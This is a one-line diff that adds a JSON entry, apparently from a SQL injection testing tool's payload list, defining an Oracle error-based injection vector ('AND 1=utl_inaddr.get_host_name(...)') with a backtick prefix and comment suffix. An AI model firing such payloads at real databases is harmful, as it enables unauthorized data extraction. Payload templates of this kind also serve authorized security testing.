@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "error", "boundary": {"prefix": "`", "suffix": "-- -", "type": "backtick"}, "vector": "{B} AND 1=utl_inaddr.get_host_name(({Q}))", "comment": "oracle error: backtick"}
